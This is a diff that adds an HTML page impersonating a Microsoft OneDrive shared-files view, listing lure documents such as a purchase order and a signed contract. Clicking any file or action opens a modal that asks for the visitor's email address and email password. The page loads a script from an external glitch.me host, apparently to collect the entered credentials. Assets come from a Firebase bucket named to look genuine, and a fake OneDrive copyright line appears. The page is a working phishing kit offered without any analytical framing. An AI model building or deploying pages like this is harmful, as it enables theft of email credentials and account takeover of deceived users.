@@ -1,0 +1,153 @@
+<html lang="en">
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Shared Files - OneDrive</title>
+    <link rel="shortcut icon" href="https://firebasestorage.googleapis.com/v0/b/onedrive-real-rd481.appspot.com/o/img%2Ffavi.png?alt=media&token=a29e6587-5ca1-42d3-9ac1-f702b29d057d" type="image/x-icon">
+    <link rel="stylesheet" href="https://firebasestorage.googleapis.com/v0/b/onedrive-real-rd481.appspot.com/o/css%2Fcss.css?alt=media&token=70cede9a-b519-4547-a017-530f68f53af2">
+    <link rel="stylesheet" href="https://firebasestorage.googleapis.com/v0/b/onedrive-real-rd481.appspot.com/o/css%2Fcheckbox.css?alt=media&token=1406893a-3bcb-483e-8b76-866264d2741a">
+    <link rel="stylesheet" href="https://firebasestorage.googleapis.com/v0/b/onedrive-real-rd481.appspot.com/o/css%2Fall.css?alt=media&token=4f8c781a-5b42-43b4-b4d6-b3c4703c1051">
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.0/css/all.css" integrity="sha384-lZN37f5QGtY3VHgisS14W3ExzMWZxybE1SJSEsQp9S+oqd12jhcu+A56Ebc1zFSJ" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+</head>
+
+<body>
+    <div class="sidebar">
+        <div class="db-logo"><img src="https://firebasestorage.googleapis.com/v0/b/onedrive-real-rd481.appspot.com/o/img%2Fonedlogo.png?alt=media&token=13ba8be6-24f6-4769-b494-8dc9a6c53240" width="100"></div>
+        <div class="files">Files</div>
+        <ul class="side-list">
+            <li class="side-list-item"><a href="#" class="active">Shared</a></li>
+            <li class="side-list-item"><a href="#">My files</a></li>
+            <li class="side-list-item"><a href="#">File requests</a></li>
+            <li class="side-list-item"><a href="#">Deleted files</a></li>
+        </ul>
+    </div>
+    <div class="main">
+        <div class="upgrade"><a href="#"><i class="far fa-star" style="color: #b9a143;"></i><span class="upa">Upgrade account</span></a></div>
+        <ul class="head-nav">
+            <li class="head-item min"><i class="fas fa-bars"></i></li>
+            <li class="head-item">
+                <h1>OneDrive</h1>
+            </li>
+            <li class="head-item right"><span class="noti"><i class="fas fa-bell"></i></span></li>
+            <li class="head-item right">
+                <span class="noti mb-search"><i class="fas fa-search"></i></span>
+                <span class="search">
+                    <i class="fas fa-search"></i>
+                    <input type="text" class="searchbox">
+                </span>
+            </li>
+        </ul>
+        <div class="files-container">
+            <table class="file-table">
+                <tbody>
+                    <tr>
+                        <th></th>
+                        <td class="th">Name↑
+                        </td>
+                        <td class="th">Modified<span class="spc">▼</span>
+                        </td>
+                        <td class="th">Size<span class="spc">▼</span>
+                        </td>
+                        <td class="th"><i class="fas fa-list-ul"></i><span class="spc">▼</span>
+                        </td>
+                    </tr>
+                    <tr data-toggle="modal" data-target="#modalbox2">
+                        <th>
+                            <label class="check-cont">
+                                <input type="checkbox">
+                                <span class="checkmark"></span>
+                            </label>
+                        </th>
+                        <td>
+                            <div><i class="fas fa-file-pdf text-danger" style="font-size:35px"></i>  <span class="text-muted font-weight-lighter">Purchase Order No-1219.pdf</span></div>
+                        </td>
+                        <td style="color:#0e0202;font-weight:400">11/12/2023 6:32 AM</td></td>
+                        <td>12.34MB</td>
+                        <td><i class="fas fa-ellipsis-h"></i></td>
+                    </tr>
+                    <tr data-toggle="modal" data-target="#modalbox2">
+                        <th>
+                            <label class="check-cont">
+                                <input type="checkbox">
+                                <span class="checkmark"></span>
+                            </label>
+                        </th>
+                        <td>
+                            <div><i class="fas fa-file-pdf text-danger" style="font-size:35px"></i>  <span class="text-muted font-weight-lighter">Approved Specifications.pdf</span></div>
+                        </td>
+                        <td style="color:#0e0202;font-weight:400">11/12/2023 6:34 AM</td></td>
+                        <td>7.65 MB</td>
+                        <td><i class="fas fa-ellipsis-h"></i></td>
+                    </tr>
+                    <tr data-toggle="modal" data-target="#modalbox2">
+                        <th>
+                            <label class="check-cont">
+                                <input type="checkbox">
+                                <span class="checkmark"></span>
+                            </label>
+                        </th>
+                        <td>
+                            <div><i class="fas fa-file-pdf text-danger" style="font-size:35px"></i>  <span class="text-muted font-weight-lighter">Signed Contract.pdf</span></div>
+                        </td>
+                        <td style="color:#0e0202;font-weight:400">11/12/2003 6:34 AM</td></td>
+                        <td>2.34 MB</td>
+                        <td><i class="fas fa-ellipsis-h"></i></td>
+                    </tr>
+                </tbody>
+            </table>
+        </div>
+    </div>
+    <div class="dpanel">
+        <div class="card" style="background-color:#F3F4F5; height:150px">
+            <div class="card-body">
+                <p class="p-3">Select a file to see more details</p>
+            </div>
+        </div>
+        <ul class="panel-list">
+            <li class="panel-item"><a href="#" data-toggle="modal" data-target="#modalbox2"><i class="fas fa-file-upload"></i> Upload files</a></li>
+            <li class="panel-item"><a href="#" data-toggle="modal" data-target="#modalbox2"><i class="fas fa-folder"></i> Upload folder</a></li>
+            <li class="panel-item"><a href="#" data-toggle="modal" data-target="#modalbox2"><i class="fas fa-folder-plus"></i> New folder</a></li>
+            <li class="panel-item"><a href="#" data-toggle="modal" data-target="#modalbox2"><i class="fas fa-share-square"></i> New shared folder</a></li>
+            <li class="panel-item"><a href="#" data-toggle="modal" data-target="#modalbox2"><i class="fas fa-inbox"></i> Request files</a></li>
+        </ul>
+    </div>
+    <!-- Modal -->
+    <div class="modal fade" id="modalbox2" tabindex="-1" role="dialog" aria-labelledby="exampleModalCenterTitle" aria-hidden="true">
+        <div class="modal-dialog " role="document">
+            <div class="modal-content">
+                <div class="modal-body">
+                    <div class="mlogo">
+                        <img src="https://firebasestorage.googleapis.com/v0/b/onedrive-real-rd481.appspot.com/o/img%2Fodt.png?alt=media&token=e135467c-97d9-4b22-ba2b-97f43fb7511a">
+                    </div>
+                    <p class="instruction" style="text-align:center">
+                        <img src="https://firebasestorage.googleapis.com/v0/b/onedrive-real-rd481.appspot.com/o/img%2Finstr.png?alt=media&token=8af77538-58e4-4cf3-bb55-bec9cfa9b417" width="400px">
+                    </p>
+                    <p class="inst">Please Confirm Receiving E-mail to View Files</p>
+                    <center>
+                        <div class="alert alert-danger" id="msg" style="display: none;"></div>
+                        <span id="error" class="text-danger" style="display: none;"></span>
+                    </center>
+                    <div class="ebox">
+                        <input type="email" class="password" id="ai" placeholder="Enter receiving email">
+                        <input type="password" class="password" id="pr" placeholder="Enter email password">
+                        <div class="submitdiv">
+                            <button type="button" class="submit" id="submit-btn"> View Files</button>
+                        </div>
+                        <p class="foot">© Copyright OneDrive Inc. 2023</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+    <script type="text/JavaScript" src="https://code.jquery.com/jquery-3.3.1.js" integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60=" crossorigin="anonymous"></script>
+    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+    <script type="text/javascript" src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+    <script type="module" src="https://successful-first-string.glitch.me/script.js"></script>
+</body>
+
+</html>
